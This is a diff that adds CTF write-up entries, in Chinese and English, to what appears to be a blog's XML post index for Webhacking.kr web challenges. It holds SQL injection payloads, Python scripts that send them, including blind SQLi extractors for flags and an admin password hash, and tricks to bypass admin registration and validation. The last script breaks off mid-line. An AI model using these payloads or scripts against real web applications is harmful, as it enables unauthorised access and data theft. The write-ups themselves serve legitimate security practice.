@@ -28411,4 +28411,918 @@ event，跳过正常移动路径。</p>
         <tag>rpg-maker</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Webhacking.kr Better than 𝒳ℳℒ</title>
+    <url>/wp/webhacking/better-than-xml/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Exploit duplicate JSON keys to make validation and storage observe
+different roles.</p>
+<p>利用重复 JSON key，让校验与存储看到不同的 role。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://webhacking.kr/challenge/new-17/</span><br></pre></td></tr></table></figure>
+<h3 id="analysis">Analysis</h3>
+<p>注册接口读取原始 JSON 后执行
+<code>json_decode($raw_json, true)</code>，验证最终解析出的
+<code>role</code> 必须为 <code>guest</code>；但原始 JSON
+会被存入数据库。重复 key 时，PHP 的 associative decode 使用后一个值，而
+MySQL JSON 文档保留重复 key，后续
+<code>JSON_EXTRACT(data,'$.role')</code> 取到前一个
+<code>admin</code>。</p>
+<h3 id="solution">Solution</h3>
+<p>注册请求体：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;userid&quot;</span><span class="punctuation">:</span><span class="string">&quot;hermesx&quot;</span><span class="punctuation">,</span><span class="attr">&quot;userpw&quot;</span><span class="punctuation">:</span><span class="string">&quot;hermesy&quot;</span><span class="punctuation">,</span><span class="attr">&quot;role&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="attr">&quot;role&quot;</span><span class="punctuation">:</span><span class="string">&quot;guest&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>请求：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">POST /challenge/new-17/?page=join_</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure>
+<p>随后使用相同 userid/userpw 登录：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">POST /challenge/new-17/?page=login_</span><br><span class="line">uid=hermesx</span><br><span class="line">upw=hermesy</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>web</tag>
+        <tag>json</tag>
+        <tag>duplicate-key</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Webhacking.kr old-03</title>
+    <url>/wp/webhacking/old-03/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Solve the Nonogram, then alter the hidden <code>answer</code> field
+in the log request.</p>
+<p>解出 5×5 Nonogram，并提交网格编码。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-03/</span><br></pre></td></tr></table></figure>
+<h3 id="analysis">Analysis</h3>
+<p>页面把 25 个格子编码为 <code>_1</code> 到 <code>_25</code>，黑格为
+<code>1</code>、白格为 <code>0</code>，JavaScript 再按顺序拼成 hidden
+字段 <code>_answer</code>。解题后出现的日志表单通过 POST 提交
+<code>answer</code> 和 <code>id</code>；<code>answer</code>
+会进入查询，而 <code>id</code> 只决定日志中的名字。观察到修改
+<code>answer</code>
+会改变查询结果后，可以在该字段结束原字符串并追加恒真条件。</p>
+<p>5×5 网格按行编码如下：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">10101</span><br><span class="line">00000</span><br><span class="line">01110</span><br><span class="line">01010</span><br><span class="line">11111</span><br></pre></td></tr></table></figure>
+<p>按行拼接后得到：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1010100000011100101011111</span><br></pre></td></tr></table></figure>
+<h3 id="solution">Solution</h3>
+<p>先用完整网格参数打开 challenge，让服务端进入 Clear
+页面；随后复用同一个 session，向日志表单提交 SQL
+injection。下面的脚本包含两个请求和所有字段：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">BASE_URL = os.environ.get(</span><br><span class="line">    <span class="string">&quot;OLD03_URL&quot;</span>, <span class="string">&quot;https://webhacking.kr/challenge/web-03/&quot;</span></span><br><span class="line">)</span><br><span class="line">GRID = &#123;</span><br><span class="line">    <span class="string">&quot;_1&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_2&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_3&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_4&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_5&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_6&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_7&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_8&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_9&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_10&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_11&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_12&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_13&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_14&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_15&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_16&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_17&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_18&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_19&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_20&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_21&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_22&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_23&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_24&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_25&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_answer&quot;</span>: <span class="string">&quot;1010100000011100101011111&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">INJECTION = <span class="string">&quot;&#x27; or 1=1-- &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">with</span> requests.Session() <span class="keyword">as</span> session:</span><br><span class="line">        clear = session.get(BASE_URL, params=GRID, timeout=<span class="number">10</span>)</span><br><span class="line">        clear.raise_for_status()</span><br><span class="line">        result = session.post(</span><br><span class="line">            BASE_URL,</span><br><span class="line">            data=&#123;<span class="string">&quot;answer&quot;</span>: INJECTION, <span class="string">&quot;id&quot;</span>: <span class="string">&quot;writeup&quot;</span>&#125;,</span><br><span class="line">            timeout=<span class="number">10</span>,</span><br><span class="line">        )</span><br><span class="line">        result.raise_for_status()</span><br><span class="line">        <span class="built_in">print</span>(result.text)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sys.exit(main())</span><br></pre></td></tr></table></figure>
+<p><code>--</code> 后面的空格是 payload
+的一部分，用于注释查询剩余内容。<code>answer</code> 必须作为 POST
+字段发送，不能只把它放在初始 Nonogram 的 GET 参数中。</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>web</tag>
+        <tag>sql-injection</tag>
+        <tag>nonogram</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Webhacking.kr old-05</title>
+    <url>/wp/webhacking/old-05/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Bypass the JavaScript-only access check and create the admin
+user.</p>
+<p>绕过只存在于 JavaScript 中的访问控制，并创建 admin 用户。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-05/</span><br></pre></td></tr></table></figure>
+<h3 id="analysis">Analysis</h3>
+<p><code>join.php</code> 的表单由混淆 JavaScript 动态生成。脚本只在
+Cookie 中出现 <code>oldzombie</code> 且 URL 包含 <code>mode=1</code>
+时显示表单，这两个条件都在客户端执行，因此可以直接构造请求访问注册接口。</p>
+<p>注册接口拒绝精确的 <code>admin</code>。可将 <code>id</code> 设为 20
+个空格后接 <code>admin</code>，注册后再用 <code>admin</code>
+登录；该边界行为依赖目标部署的字段截断与比较规则。</p>
+<h3 id="solution">Solution</h3>
+<p>下面的脚本用同一个 session 完成注册和登录。<code>REGISTER_ID</code>
+中的 20 个空格必须保留；直接在浏览器表单输入可能被
+<code>maxlength</code> 截断，所以脚本直接发送 POST body。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">BASE_URL = os.environ.get(</span><br><span class="line">    <span class="string">&quot;OLD05_URL&quot;</span>, <span class="string">&quot;https://webhacking.kr/challenge/web-05&quot;</span></span><br><span class="line">)</span><br><span class="line">JOIN_URL = <span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/mem/join.php?mode=1&quot;</span></span><br><span class="line">LOGIN_URL = <span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/mem/login.php&quot;</span></span><br><span class="line">COOKIE_NAME = <span class="string">&quot;oldzombie&quot;</span></span><br><span class="line">REGISTER_ID = (<span class="string">&quot; &quot;</span> * <span class="number">20</span>) + <span class="string">&quot;admin&quot;</span></span><br><span class="line">LOGIN_ID = <span class="string">&quot;admin&quot;</span></span><br><span class="line">PASSWORD = <span class="string">&quot;1234&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">with</span> requests.Session() <span class="keyword">as</span> session:</span><br><span class="line">        session.cookies.<span class="built_in">set</span>(COOKIE_NAME, <span class="string">&quot;hello&quot;</span>)</span><br><span class="line">        register = session.post(</span><br><span class="line">            JOIN_URL,</span><br><span class="line">            data=&#123;<span class="string">&quot;id&quot;</span>: REGISTER_ID, <span class="string">&quot;pw&quot;</span>: PASSWORD&#125;,</span><br><span class="line">            timeout=<span class="number">10</span>,</span><br><span class="line">        )</span><br><span class="line">        register.raise_for_status()</span><br><span class="line">        <span class="built_in">print</span>(register.text)</span><br><span class="line"></span><br><span class="line">        login = session.post(</span><br><span class="line">            LOGIN_URL,</span><br><span class="line">            data=&#123;<span class="string">&quot;id&quot;</span>: LOGIN_ID, <span class="string">&quot;pw&quot;</span>: PASSWORD&#125;,</span><br><span class="line">            timeout=<span class="number">10</span>,</span><br><span class="line">        )</span><br><span class="line">        login.raise_for_status()</span><br><span class="line">        <span class="built_in">print</span>(login.text)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sys.exit(main())</span><br></pre></td></tr></table></figure>
+<p>如果客户端或代理会裁剪前导空格，应确认原始 form body 仍包含 20
+个空格后再发送。<code>mode=1</code>
+只用于打开注册页面，<code>oldzombie=hello</code> 只用于通过 JavaScript
+检查。</p>
+<p>注册字段的前导空格数量取决于题目部署的字段长度与比较规则；复现时以目标响应确认服务端是否保留
+20 个空格。</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>web</tag>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Webhacking.kr old-07</title>
+    <url>/wp/webhacking/old-07/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Bypass the SQL filters and make the selected value equal 2.</p>
+<p>绕过 SQL 过滤器，让查询结果变成 2。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-07/</span><br></pre></td></tr></table></figure>
+<h3 id="analysis">Analysis</h3>
+<p>源码随机用 1 到 5 层括号包裹
+<code>val</code>，再把查询结果的第一列当作
+level。输入过滤器拒绝直接出现数字 <code>2</code>，但
+<code>ceil(1.5)</code> 的结果是整数 <code>2</code>，且 payload
+不含被拦截的字面量。用 UNION
+追加一行，就能让结果集的第一行成为这个值；结尾的 <code>#</code>
+用来注释随机包装后剩余的 SQL。</p>
+<h3 id="solution">Solution</h3>
+<p>下面的脚本通过 <code>params</code> 传递值。<code>requests</code> 会把
+payload 中的 <code>#</code> 编码为
+<code>%23</code>，服务器解码一次后才得到 SQL
+注释符；不要手工把已经编码的 <code>%23</code> 再传入
+<code>params</code>，否则可能变成双重编码。由于服务端的括号层数随机，脚本最多重试
+10 次。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = os.environ.get(</span><br><span class="line">    <span class="string">&quot;OLD07_URL&quot;</span>, <span class="string">&quot;https://webhacking.kr/challenge/web-07/&quot;</span></span><br><span class="line">)</span><br><span class="line">PAYLOAD = <span class="string">&quot;0)union(select(ceil(1.5)))#&quot;</span></span><br><span class="line">ATTEMPTS = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">with</span> requests.Session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> attempt <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, ATTEMPTS + <span class="number">1</span>):</span><br><span class="line">            response = session.get(</span><br><span class="line">                URL,</span><br><span class="line">                params=&#123;<span class="string">&quot;val&quot;</span>: PAYLOAD&#125;,</span><br><span class="line">                timeout=<span class="number">10</span>,</span><br><span class="line">            )</span><br><span class="line">            response.raise_for_status()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;attempt <span class="subst">&#123;attempt&#125;</span>: <span class="subst">&#123;response.url&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;old-07&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(response.text)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;The random query wrapper did not accept the payload in this run.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sys.exit(main())</span><br></pre></td></tr></table></figure>
+<p>若直接构造 URL，请使用：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-07/?val=0%29union%28select%28ceil%281.5%29%29%29%23</span><br></pre></td></tr></table></figure>
+<p>这里的 <code>%23</code> 是 URL 层的编码形式，不能把字面量
+<code>#</code> 留在 URL 中，否则浏览器会把它当作 fragment
+而不发送给服务器。</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>web</tag>
+        <tag>sql-injection</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Webhacking.kr old-12</title>
+    <url>/wp/webhacking/old-12/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Understand the obfuscated JavaScript route check.</p>
+<p>分析混淆 JavaScript 的路径检查。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://webhacking.kr/challenge/code-3/</span><br></pre></td></tr></table></figure>
+<h3 id="analysis">Analysis</h3>
+<p>页面源码是 aaencode 风格的 JavaScript。解码后，脚本从 URL 的
+<code>=</code> 之后取值，并将一组 <code>String.fromCharCode</code>
+结果与它比较。比较通过后，脚本执行：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">location.<span class="property">href</span> = <span class="string">&quot;./&quot;</span> + ck.<span class="title function_">replace</span>(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>) + <span class="string">&quot;.php&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>解码比较值后得到目标文件名
+<code>youaregod~~~~~~~!.php</code>，所以无需依赖浏览器执行混淆脚本，也可以直接请求生成后的路径。</p>
+<h3 id="solution">Solution</h3>
+<p>直接请求下面的完整 URL。<code>--path-as-is</code> 让 curl
+保留路径中的 <code>~</code> 和 <code>!</code>：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl --path-as-is <span class="string">&#x27;https://webhacking.kr/challenge/code-3/youaregod~~~~~~~!.php&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>浏览器中也可以直接访问：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://webhacking.kr/challenge/code-3/youaregod~~~~~~~!.php</span><br></pre></td></tr></table></figure>
+<p>请求目标路径即为题目要求的隐藏文件。</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>web</tag>
+        <tag>javascript</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Webhacking.kr old-13</title>
+    <url>/wp/webhacking/old-13/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Extract the flag through the filtered blind SQL injection.</p>
+<p>通过带过滤的 blind SQL injection 提取 flag。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-10/</span><br></pre></td></tr></table></figure>
+<h3 id="analysis">Analysis</h3>
+<p><code>no</code> 参数进入 SQL
+查询，页面用结果值区分真假。过滤器会阻止空格、比较符、<code>LIKE</code>、<code>LIMIT</code>、<code>UNION</code>
+等常见写法，但保留括号、<code>SELECT</code>、<code>FROM</code>、<code>SUBSTR</code>、<code>ORD</code>
+和 <code>IN</code>。因此可以写成无空格的表达式，并用
+<code>MIN</code>/<code>MAX</code> 在不能使用 <code>LIMIT</code>
+时选取目标行。</p>
+<p>当前题型的对象为
+<code>chall13.flag_ab733768.flag_3a55b31d</code>。对最长 flag 使用
+<code>MAX(flag_3a55b31d)</code>，然后逐位置测试字符的 ASCII 值：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">ORD(SUBSTR((<span class="keyword">SELECT</span>(<span class="built_in">MAX</span>(flag_3a55b31d))<span class="keyword">FROM</span>(flag_ab733768)),<span class="operator">&lt;</span>position<span class="operator">&gt;</span>,<span class="number">1</span>))<span class="keyword">IN</span>(<span class="operator">&lt;</span>ascii<span class="operator">&gt;</span>)</span><br></pre></td></tr></table></figure>
+<p>当页面结果为 <code>1</code> 时，当前字符匹配。flag 长度为
+27，字符范围取 0 到 127 足以覆盖结果。</p>
+<h3 id="solution">Solution</h3>
+<p>下面是完整的 Python 提取脚本。它只读取题目的 SQLi oracle；登录
+session 从环境变量取得，文章中不包含真实 Cookie。脚本用
+<code>requests</code> 自动 URL-encode <code>no</code> 参数，并打印恢复的
+flag：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">&quot;https://webhacking.kr/challenge/web-10/&quot;</span></span><br><span class="line">TRUE_MARKER = <span class="string">&quot;&lt;td&gt;1&lt;/td&gt;&quot;</span></span><br><span class="line">TABLE_NAME = <span class="string">&quot;flag_ab733768&quot;</span></span><br><span class="line">COLUMN_NAME = <span class="string">&quot;flag_3a55b31d&quot;</span></span><br><span class="line">FLAG_LENGTH = <span class="number">27</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_payload</span>(<span class="params">position, character_code</span>):</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="string">&quot;ORD(SUBSTR((SELECT(MAX(&#123;&#125;))FROM(&#123;&#125;)),&#123;&#125;,1))IN(&#123;&#125;)&quot;</span></span><br><span class="line">        .<span class="built_in">format</span>(COLUMN_NAME, TABLE_NAME, position, character_code)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">session, payload</span>):</span><br><span class="line">    response = session.get(</span><br><span class="line">        BASE_URL,</span><br><span class="line">        params=&#123;<span class="string">&quot;no&quot;</span>: payload&#125;,</span><br><span class="line">        timeout=<span class="number">20</span>,</span><br><span class="line">    )</span><br><span class="line">    response.raise_for_status()</span><br><span class="line">    <span class="keyword">return</span> TRUE_MARKER <span class="keyword">in</span> response.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_flag</span>(<span class="params">session</span>):</span><br><span class="line">    flag = []</span><br><span class="line">    <span class="keyword">for</span> position <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, FLAG_LENGTH + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> character_code <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">            <span class="keyword">if</span> oracle(session, make_payload(position, character_code)):</span><br><span class="line">                flag.append(<span class="built_in">chr</span>(character_code))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;no character matched at position <span class="subst">&#123;position&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    session_cookie = os.environ.get(<span class="string">&quot;CHALLENGE_SESSION&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session_cookie:</span><br><span class="line">        <span class="keyword">raise</span> SystemExit(<span class="string">&quot;set session-cookie to your own challenge session before running&quot;</span>)</span><br><span class="line"></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    session.cookies.<span class="built_in">set</span>(<span class="string">&quot;PHPSESSID&quot;</span>, session_cookie, domain=<span class="string">&quot;webhacking.kr&quot;</span>, path=<span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line">    flag = extract_flag(session)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>web</tag>
+        <tag>blind-sql-injection</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Webhacking.kr old-18</title>
+    <url>/wp/webhacking/old-18/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Make the query return the admin row while bypassing the space
+filter.</p>
+<p>绕过空格过滤，让查询返回 admin 记录。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-32/</span><br></pre></td></tr></table></figure>
+<h3 id="analysis">Analysis</h3>
+<p>题目的查询形态把 <code>no</code> 输入置于括号中，题面注释给出 admin
+的 <code>no</code> 为 <code>2</code>。<code>0</code> 让
+<code>id='guest'</code> 条件为假，<code>OR no LIKE 2</code> 选中
+admin；<code>LIKE</code> 在这里承担比较作用，避开被过滤的
+<code>=</code>。<code>%09</code> 解码为 Tab，可替代被过滤的空格；payload
+先闭合输入外层括号，再用 <code>--</code> 注释掉查询末尾的剩余字符。</p>
+<h3 id="solution">Solution</h3>
+<p>下面构造请求，不发送请求：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlencode</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> Request</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">&quot;https://webhacking.kr/challenge/web-32/&quot;</span></span><br><span class="line">payload = <span class="string">&quot;0)\tor\tno\tlike\t2\t--\t&quot;</span></span><br><span class="line">request_url = BASE_URL + <span class="string">&quot;?&quot;</span> + urlencode(&#123;<span class="string">&quot;no&quot;</span>: payload&#125;)</span><br><span class="line">request = Request(request_url, method=<span class="string">&quot;GET&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(request.full_url)</span><br></pre></td></tr></table></figure>
+<p>URL 解码后的 <code>no</code> 值为
+<code>0)\tor\tno\tlike\t2\t--\t</code>，其中没有普通空格，也没有
+<code>=</code>；末尾注释会吞掉服务端拼接的其余内容。</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>web</tag>
+        <tag>sql-injection</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Webhacking.kr old-22</title>
+    <url>/wp/webhacking/old-22/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Log in as admin through the password-hash SQL injection.</p>
+<p>通过密码哈希 SQL injection 以 admin 身份登录。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://webhacking.kr/challenge/bonus-2/</span><br></pre></td></tr></table></figure>
+<h3 id="analysis">Analysis</h3>
+<p>登录接口把 <code>uuid</code> 放入用户查询，返回值能区分
+<code>Wrong password!</code> 与
+<code>Login Fail!</code>。前者表示注入条件命中了记录但提交的密码不匹配，后者表示条件没有命中，所以可以用同一个
+oracle 逐字符读取 admin 的 <code>pw</code> 字段。</p>
+<p>已知该字段是 32 位十六进制
+MD5，注册并登录普通账号可以确认服务端计算的是
+<code>md5(password + "apple")</code>。MD5
+结果需要通过候选明文重新计算并比较；拿到 admin 的 digest
+后，应对候选明文逐个计算 <code>md5(candidate + "apple")</code>
+并比较。</p>
+<h3 id="solution">Solution</h3>
+<p>下面的脚本包含完整的 blind SQLi、MD5
+验证和正常登录请求。候选密码通过命令行传入，区分哈希值与明文候选：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;https://webhacking.kr/challenge/bonus-2/index.php&quot;</span></span><br><span class="line">TRUE_MARKER = <span class="string">&quot;wrong password!&quot;</span></span><br><span class="line">FALSE_MARKER = <span class="string">&quot;login fail&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">session, condition</span>):</span><br><span class="line">    injection = <span class="string">f&quot;admin&#x27; and (<span class="subst">&#123;condition&#125;</span>)#&quot;</span></span><br><span class="line">    response = session.post(</span><br><span class="line">        URL,</span><br><span class="line">        data=&#123;<span class="string">&quot;uuid&quot;</span>: injection, <span class="string">&quot;pw&quot;</span>: <span class="string">&quot;probe&quot;</span>&#125;,</span><br><span class="line">        timeout=<span class="number">10</span>,</span><br><span class="line">    )</span><br><span class="line">    response.raise_for_status()</span><br><span class="line">    body = response.text.lower()</span><br><span class="line">    <span class="keyword">if</span> TRUE_MARKER <span class="keyword">in</span> body:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> FALSE_MARKER <span class="keyword">in</span> body:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;response did not contain a known oracle marker&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_hash</span>(<span class="params">session</span>):</span><br><span class="line">    digest_length = <span class="number">32</span></span><br><span class="line">    hex_chars = <span class="string">&quot;0123456789abcdef&quot;</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> position <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, digest_length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span 